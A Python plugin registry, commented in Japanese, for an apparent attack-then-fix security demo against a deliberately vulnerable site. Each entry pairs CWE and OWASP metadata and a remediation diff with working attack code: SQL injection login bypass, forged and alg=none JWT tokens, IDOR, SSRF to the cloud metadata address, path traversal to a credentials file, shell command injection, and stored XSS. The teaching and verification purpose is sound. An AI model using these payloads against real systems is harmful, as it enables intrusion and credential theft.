"""脆弱性プラグイン＝このシステムの単一の真実（source of truth）。

1 つの脆弱性につき、メタ情報・CWE/OWASP・攻撃の実行と成功判定・修正差分・侵入マップ
表示を 1 箇所（Plugin）にまとめる。攻撃（attack.py）・カタログ（vulns.py）・照合
（cve.py）・修復（fix.py）・ループ（main.py）はすべてここを参照するだけにする。

新しい脆弱性を増やすときは、このファイルに Plugin を 1 つ足し、ATTACK_ORDER に id を
加え、やられ役サイト側に `isVulnerable(id)` で分岐する実装を用意すればよい。
"""
from __future__ import annotations

import base64
import json
from dataclasses import dataclass
from typing import Awaitable, Callable

import httpx

import manifest

VulnId = str


@dataclass
class AttackResult:
    success: bool
    evidence: str
    payload: str


@dataclass(frozen=True)
class FixSpec:
    file: str        # 直すファイル
    location: str    # 箇所（file:line 相当の表示）
    summary: str     # 何をなぜ直すか（1〜2文）
    diff: str        # 承認前に見せる unified diff 風テキスト


@dataclass
class Plugin:
    id: VulnId
    name: str              # 日本語名
    location: str          # 仕込まれる場所
    attack_desc: str       # 攻撃のされ方（照合・カタログ用の短い説明）
    fix_desc: str          # 直し方（短い説明）
    severity: str          # high | medium | low
    cwe: str               # 例: CWE-89
    owasp: str             # 例: A03:2021 インジェクション
    note: str              # 照合時に出す一言
    data_node: str         # 侵入マップの到達先ノードID
    data_node_label: str   # 到達先ノードの表示名
    records: int           # 抜けるダミーレコードの目安件数
    attack: Callable[[httpx.AsyncClient, str], Awaitable[AttackResult]]
    fix: FixSpec


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# ───────────────────────── 攻撃の実装 ─────────────────────────
# 各関数は「成功したか」と「証拠」を返す。修正適用後に同じ関数をもう一度呼ぶと、
# 今度は弾かれる（success=False）ことで防御を証明する。

async def _sqli(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "username=admin' --  (パスワード無視)"
    try:
        res = await client.post(
            target + manifest.endpoint("sqli", "/api/login"),
            json={"username": "admin' --", "password": "wrong-password"},
            timeout=10,
        )
        if res.status_code == 200 and "token" in res.json():
            u = res.json().get("user", {})
            return AttackResult(
                True,
                f"パスワード無しで {u.get('username')}（{u.get('role')}）としてログイン成功",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "ログインは拒否された（プレースホルダで防御）", payload)


async def _auth(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "Authorization: Bearer user-1（管理者IDを推測して偽造）"
    try:
        res = await client.get(
            target + manifest.endpoint("auth", "/api/me"),
            headers={"authorization": "Bearer user-1"},
            timeout=10,
        )
        if res.status_code == 200:
            u = res.json().get("user", {})
            if u.get("role") == "admin":
                return AttackResult(
                    True,
                    f"推測トークンで管理者 {u.get('username')} になりすまし成功",
                    payload,
                )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "偽造トークンは拒否された（署名検証で防御）", payload)


async def _misconfig(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "GET /api/debug（認証なし）"
    try:
        res = await client.get(target + manifest.endpoint("misconfig", "/api/debug"), timeout=10)
        if res.status_code == 200:
            data = res.json()
            n = len(data.get("users", []))
            return AttackResult(
                True,
                f"内部設定と全ユーザー{n}件（パスワード・カード番号含む）が露出",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "デバッグ情報は非公開（403）", payload)


async def _access(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "GET /api/orders/1002（他人の注文IDを直接指定・無認証）"
    try:
        res = await client.get(target + manifest.endpoint("access", "/api/orders/1002"), timeout=10)
        if res.status_code == 200:
            o = res.json().get("order", {})
            return AttackResult(
                True,
                f"他人の注文#{o.get('id')}（{o.get('address')} / ¥{o.get('total')}）を無認証で閲覧",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "他人の注文は拒否された（所有者チェックで防御）", payload)


async def _xss(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = '<script>alert(document.cookie)</script> をレビュー投稿'
    marker = "<script>alert(document.cookie)</script>"
    try:
        await client.post(
            target + manifest.endpoint("xss", "/api/products/1/reviews"),
            json={"author": "antibody-agent", "body": marker},
            timeout=10,
        )
        res = await client.get(target + manifest.endpoint("xss", "/api/products/1/reviews"), timeout=10)
        bodies = " ".join(r.get("body_html", "") for r in res.json().get("reviews", []))
        if marker in bodies:
            return AttackResult(
                True,
                "投稿した<script>が無加工で出力され、実行可能な状態",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "スクリプトはエスケープされ無害化（出力エスケープで防御）", payload)


async def _pathtraversal(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "GET /api/files?name=../secret/credentials.txt"
    try:
        res = await client.get(
            target + manifest.endpoint("pathtraversal", "/api/files"),
            params={"name": "../secret/credentials.txt"},
            timeout=10,
        )
        if res.status_code == 200:
            content = res.json().get("content", "")
            if "DB_PASSWORD" in content or "ADMIN_TOKEN" in content:
                return AttackResult(
                    True,
                    "公開範囲外の secret/credentials.txt を読み出し、認証情報が流出",
                    payload,
                )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "公開ディレクトリ外は参照拒否（basename限定で防御）", payload)


async def _cmdi(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "GET /api/net-tool?host=localhost; id"
    try:
        res = await client.get(
            target + manifest.endpoint("cmdi", "/api/net-tool"),
            params={"host": "localhost; id"},
            timeout=10,
        )
        if res.status_code == 200:
            out = res.json().get("output", "")
            if "uid=0(root)" in out:
                return AttackResult(
                    True,
                    "ping に紛れ込ませた id が実行され uid=0(root) を取得（任意コマンド実行）",
                    payload,
                )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "メタ文字を含む入力は拒否（シェル不使用で防御）", payload)


async def _jwt(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "Authorization: Bearer <alg=none で role=admin を自作したJWT>"
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    claims = _b64url(json.dumps({"sub": 1, "role": "admin", "username": "admin"}).encode())
    forged = f"{header}.{claims}."  # 署名なし
    try:
        res = await client.get(
            target + manifest.endpoint("jwt", "/api/session"),
            headers={"authorization": f"Bearer {forged}"},
            timeout=10,
        )
        if res.status_code == 200:
            c = res.json().get("claims", {})
            if c.get("role") == "admin":
                return AttackResult(
                    True,
                    f"alg=none の署名なしトークンで {c.get('username')}（admin）に権限昇格",
                    payload,
                )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "alg=none は拒否（HS256署名の検証で防御）", payload)


async def _ssrf(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/"
    try:
        res = await client.get(
            target + manifest.endpoint("ssrf", "/api/fetch"),
            params={"url": "http://169.254.169.254/latest/meta-data/iam/"},
            timeout=10,
        )
        if res.status_code == 200:
            body = res.json().get("body", "")
            if "AccessKeyId" in body or "SecretAccessKey" in body:
                return AttackResult(
                    True,
                    "内部メタデータ(169.254.169.254)へ到達し一時認証情報を奪取",
                    payload,
                )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "内部アドレス宛は遮断（宛先検査で防御）", payload)


# ───────────────────────── プラグイン定義 ─────────────────────────
PLUGINS: dict[VulnId, Plugin] = {
    "sqli": Plugin(
        id="sqli", name="SQLインジェクション", location="ログイン",
        attack_desc="入力をSQL文にそのまま連結", fix_desc="プレースホルダで入力を分離",
        severity="high", cwe="CWE-89", owasp="A03:2021 インジェクション",
        note="ユーザー入力をSQLに連結する実装は古典的な攻撃対象",
        data_node="db_auth", data_node_label="認証DB", records=3,
        attack=_sqli,
        fix=FixSpec(
            file="target/lib/vulns/sqli.ts",
            location="lib/vulns/sqli.ts:31 authenticate()",
            summary="ユーザー入力を SQL 文字列へ連結していた箇所を、プレースホルダ"
            "（プリペアドステートメント）で分離する。入力が命令として解釈されなくなる。",
            diff=(
                "--- a/lib/vulns/sqli.ts\n"
                "+++ b/lib/vulns/sqli.ts\n"
                "@@ authenticate()\n"
                "-  const sql = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n"
                "-  const user = db.prepare(sql).get() as UserRow | undefined;\n"
                "+  const sql = \"SELECT * FROM users WHERE username = ? AND password = ?\";\n"
                "+  const user = db.prepare(sql).get(username, password) as UserRow | undefined;\n"
                "   return { user: user ?? null, sqlUsed: sql };\n"
            ),
        ),
    ),
    "auth": Plugin(
        id="auth", name="認証の甘さ", location="セッション",
        attack_desc="推測可能なトークンでなりすまし", fix_desc="強いトークン・検証を追加",
        severity="high", cwe="CWE-330", owasp="A07:2021 識別と認証の失敗",
        note="推測可能なセッショントークン",
        data_node="session", data_node_label="管理者セッション", records=1,
        attack=_auth,
        fix=FixSpec(
            file="target/lib/vulns/auth.ts",
            location="lib/vulns/auth.ts:issueToken()/verifyToken()",
            summary="推測可能な `user-<id>` 形式のトークンをやめ、乱数＋HMAC 署名の"
            "トークンだけを受理する。改ざん・推測によるなりすましを弾く。",
            diff=(
                "--- a/lib/vulns/auth.ts\n"
                "+++ b/lib/vulns/auth.ts\n"
                "@@ issueToken()\n"
                "-  const token = `user-${userId}`;        // 推測可能\n"
                "+  const rnd = randomBytes(16).toString(\"hex\");\n"
                "+  const raw = `${userId}.${rnd}`;\n"
                "+  const token = `sess_${raw}.${sign(raw)}`;  // 乱数+HMAC署名\n"
                "@@ verifyToken()\n"
                "-  const m = /^user-(\\d+)$/.exec(token); if (m) return Number(m[1]);\n"
                "+  const m = /^sess_(\\d+\\.[0-9a-f]+)\\.([0-9a-f]{32})$/.exec(token);\n"
                "+  if (!m || sign(m[1]) !== m[2] || !store().has(token)) return null;\n"
                "+  return Number(m[1].split(\".\")[0]);\n"
            ),
        ),
    ),
    "jwt": Plugin(
        id="jwt", name="JWT改ざん（alg=none）", location="APIセッション",
        attack_desc="alg=none の署名なしトークンで権限昇格",
        fix_desc="alg=none を拒否し HS256 署名を必須にする",
        severity="high", cwe="CWE-347", owasp="A02:2021 暗号化の失敗",
        note="JWT の alg=none を信頼してしまう署名検証の欠陥",
        data_node="api_session", data_node_label="APIセッション", records=1,
        attack=_jwt,
        fix=FixSpec(
            file="target/lib/vulns/jwt.ts",
            location="lib/vulns/jwt.ts:verifySession()",
            summary="header.alg が none のとき署名を検証せず payload を信頼していた。"
            "alg=none を明確に拒否し、HS256 の署名検証に通ったものだけを受理する。",
            diff=(
                "--- a/lib/vulns/jwt.ts\n"
                "+++ b/lib/vulns/jwt.ts\n"
                "@@ verifySession()\n"
                "-  if ((header.alg || \"\").toLowerCase() === \"none\") {\n"
                "-    return { ok: true, claims };   // 署名を検証しない（危険）\n"
                "-  }\n"
                "+  if ((header.alg || \"\").toLowerCase() !== \"hs256\") {\n"
                "+    return { ok: false, reason: \"許可されていない alg です\" };\n"
                "+  }\n"
                "+  if (!timingSafeEqual(Buffer.from(parts[2]), Buffer.from(hs256(input))))\n"
                "+    return { ok: false, reason: \"署名検証に失敗しました\" };\n"
            ),
        ),
    ),
    "access": Plugin(
        id="access", name="アクセス制御の不備", location="注文履歴",
        attack_desc="IDを変えると他人の情報が見える", fix_desc="所有者チェックを追加",
        severity="high", cwe="CWE-639", owasp="A01:2021 アクセス制御の不備",
        note="所有者チェック欠如による IDOR",
        data_node="orders", data_node_label="顧客注文データ", records=3,
        attack=_access,
        fix=FixSpec(
            file="target/lib/vulns/access.ts",
            location="lib/vulns/access.ts:canReadOrder()",
            summary="注文を無条件に読めていた箇所へ所有者チェックを追加する。"
            "要求者が注文の所有者、または管理者のときだけ許可する。",
            diff=(
                "--- a/lib/vulns/access.ts\n"
                "+++ b/lib/vulns/access.ts\n"
                "@@ canReadOrder()\n"
                "-  return true; // 誰でも読めてしまう（危険）\n"
                "+  if (info.requesterUserId === null) return false;\n"
                "+  if (info.requesterRole === \"admin\") return true;\n"
                "+  return info.orderUserId === info.requesterUserId;\n"
            ),
        ),
    ),
    "ssrf": Plugin(
        id="ssrf", name="SSRF", location="URL取り込み",
        attack_desc="内部アドレスへリクエストを向けさせ機密を奪う",
        fix_desc="内部・プライベート宛先を遮断し許可リストに限定する",
        severity="high", cwe="CWE-918", owasp="A10:2021 SSRF",
        note="宛先未検査の URL 取得による内部リソースへの到達",
        data_node="internal_meta", data_node_label="内部メタデータ", records=1,
        attack=_ssrf,
        fix=FixSpec(
            file="target/lib/vulns/ssrf.ts",
            location="lib/vulns/ssrf.ts:fetchUrl()",
            summary="宛先を検査せず取得していた箇所に、内部・プライベート・メタデータ"
            "宛先を遮断する検査を追加する。到達可能な宛先を限定する。",
            diff=(
                "--- a/lib/vulns/ssrf.ts\n"
                "+++ b/lib/vulns/ssrf.ts\n"
                "@@ fetchUrl()\n"
                "-  if (INTERNAL_RESPONSES[host]) {\n"
                "-    return { ok: true, status: 200, body: INTERNAL_RESPONSES[host] }; // 内部にも到達（危険）\n"
                "-  }\n"
                "+  if (isInternalHost(host)) {\n"
                "+    return { ok: false, status: 403, reason: \"内部アドレスへの取得は禁止されています\" };\n"
                "+  }\n"
            ),
        ),
    ),
    "pathtraversal": Plugin(
        id="pathtraversal", name="パストラバーサル", location="ファイル取得",
        attack_desc="?name=../ でサーバ内の任意ファイルを読む",
        fix_desc="ファイル名を basename に限定し公開ディレクトリ内へ閉じ込める",
        severity="high", cwe="CWE-22", owasp="A01:2021 アクセス制御の不備",
        note="`../` を解決してしまう公開ディレクトリ外への脱出",
        data_node="server_files", data_node_label="サーバ内ファイル", records=1,
        attack=_pathtraversal,
        fix=FixSpec(
            file="target/lib/vulns/pathtraversal.ts",
            location="lib/vulns/pathtraversal.ts:readUserFile()",
            summary="要求ファイル名を公開ディレクトリへそのまま連結し `../` 脱出を"
            "許していた。ファイル名を basename に落とし、公開ディレクトリ内に閉じ込める。",
            diff=(
                "--- a/lib/vulns/pathtraversal.ts\n"
                "+++ b/lib/vulns/pathtraversal.ts\n"
                "@@ readUserFile()\n"
                "-  const path = resolveUnsafe(name);   // ../ を解決してしまう（危険）\n"
                "-  const content = VFS[path];\n"
                "+  const base = name.split(/[\\\\/]/).pop() || \"\";\n"
                "+  const path = PUBLIC_DIR + base;      // basename のみ・公開ディレクトリ内に限定\n"
                "+  const content = VFS[path];\n"
            ),
        ),
    ),
    "cmdi": Plugin(
        id="cmdi", name="コマンドインジェクション", location="ネットワーク診断ツール",
        attack_desc="入力を OS コマンドへ連結し任意コマンドを実行",
        fix_desc="シェルを介さず入力を厳格に検証する",
        severity="high", cwe="CWE-78", owasp="A03:2021 インジェクション",
        note="入力のシェル連結による任意コマンド実行",
        data_node="os_shell", data_node_label="OSシェル", records=1,
        attack=_cmdi,
        fix=FixSpec(
            file="target/lib/vulns/cmdi.ts",
            location="lib/vulns/cmdi.ts:runNetTool()",
            summary="host をシェル文字列へ連結し追加コマンドの実行を許していた。"
            "シェルを介さず、host をホスト名として厳格に検証しメタ文字を拒否する。",
            diff=(
                "--- a/lib/vulns/cmdi.ts\n"
                "+++ b/lib/vulns/cmdi.ts\n"
                "@@ runNetTool()\n"
                "-  const parts = host.split(/\\s*(?:;|&&|\\|\\||\\||&)\\s*/).filter(Boolean);\n"
                "-  // ping 以外に紛れ込んだコマンドが実行される（危険）\n"
                "+  if (SHELL_META.test(host) || !/^[a-zA-Z0-9.-]+$/.test(host)) {\n"
                "+    return { ok: false, output: \"不正なホスト名です\", injected: false };\n"
                "+  }\n"
            ),
        ),
    ),
    "misconfig": Plugin(
        id="misconfig", name="設定ミス", location="管理・デバッグ",
        attack_desc="公開すべきでない内部情報が露出", fix_desc="公開範囲を制限",
        severity="medium", cwe="CWE-200", owasp="A05:2021 セキュリティ設定ミス",
        note="デバッグ情報の意図しない公開",
        data_node="internal", data_node_label="内部設定・全ユーザー", records=3,
        attack=_misconfig,
        fix=FixSpec(
            file="target/lib/vulns/misconfig.ts",
            location="lib/vulns/misconfig.ts:debugExposure() / api/debug",
            summary="認証なしで内部設定と全ユーザー情報を返していたデバッグ用経路を"
            "公開しない（403）。本番に残してはいけない出力を塞ぐ。",
            diff=(
                "--- a/lib/vulns/misconfig.ts\n"
                "+++ b/lib/vulns/misconfig.ts\n"
                "@@ debugExposure()\n"
                "-  const users = db.prepare(\"SELECT * FROM users\").all() as UserRow[];\n"
                "-  return { exposed: true, data: { note, env, users } };\n"
                "+  return { exposed: false };   // 内部情報は公開しない（/api/debug は 403）\n"
            ),
        ),
    ),
    "xss": Plugin(
        id="xss", name="XSS（格納型）", location="レビュー投稿",
        attack_desc="入力を無加工で画面に出力", fix_desc="出力時にエスケープ",
        severity="high", cwe="CWE-79", owasp="A03:2021 インジェクション",
        note="出力エスケープ漏れによる格納型XSS",
        data_node="review_view", data_node_label="レビュー表示", records=2,
        attack=_xss,
        fix=FixSpec(
            file="target/lib/vulns/xss.ts",
            location="lib/vulns/xss.ts:renderReviewBody()",
            summary="レビュー本文を無加工で出力していた箇所を、表示前に HTML エスケープ"
            "する。投稿された `<script>` がタグではなく文字として表示される。",
            diff=(
                "--- a/lib/vulns/xss.ts\n"
                "+++ b/lib/vulns/xss.ts\n"
                "@@ renderReviewBody()\n"
                "-  return body; // 無加工でそのまま出力（危険）\n"
                "+  return escapeHtml(body); // 出力時にエスケープ\n"
            ),
        ),
    ),
}

# 攻撃を試す順序（連鎖的侵入の物語になる順）。
ATTACK_ORDER: list[VulnId] = [
    "sqli", "auth", "jwt", "access", "ssrf",
    "pathtraversal", "cmdi", "misconfig", "xss",
]
